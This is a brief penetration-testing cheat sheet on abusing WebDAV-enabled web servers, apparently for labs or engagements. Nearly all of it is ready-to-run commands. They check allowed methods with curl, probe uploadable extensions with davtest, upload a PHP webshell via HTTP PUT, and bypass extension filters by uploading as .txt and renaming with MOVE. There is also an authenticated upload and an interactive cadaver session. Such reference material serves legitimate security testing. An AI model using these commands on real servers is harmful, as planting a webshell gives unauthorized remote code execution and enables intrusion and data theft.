# WebDAV File Upload (davtest)

WebDAV-enabled web server allows uploading files via HTTP PUT/MOVE. Test for writeable extensions and upload a webshell.

## Check for WebDAV
```bash
curl -X OPTIONS http://<TARGET>/webdav/ -v
# Look for: Allow: OPTIONS, PROPFIND, GET, HEAD, POST, DELETE, TRACE, PROPPATCH, COPY, MOVE, LOCK, UNLOCK, PUT
```

## Test Uploadable Extensions (davtest)
```bash
davtest -url http://<TARGET>/webdav/
# Tests which extensions can be uploaded and executed
```

## Upload Webshell via PUT
```bash
# Upload PHP webshell
curl -X PUT http://<TARGET>/webdav/shell.txt --data-binary @shell.php

# Rename to .php using MOVE
curl -X MOVE --header 'Destination:http://<TARGET>/webdav/shell.php' http://<TARGET>/webdav/shell.txt
```

## With Authentication
```bash
curl -u <user>:<pass> -X PUT http://<TARGET>/webdav/shell.php --data-binary @shell.php
```

## cadaver (Interactive WebDAV Client)
```bash
cadaver http://<TARGET>/webdav/
# dav:/webdav/> put shell.php
# dav:/webdav/> ls
```

## Notes
- Common on IIS with WebDAV enabled
- Some configs block .php but allow .txt then rename via MOVE
- Requires write permissions on the WebDAV share
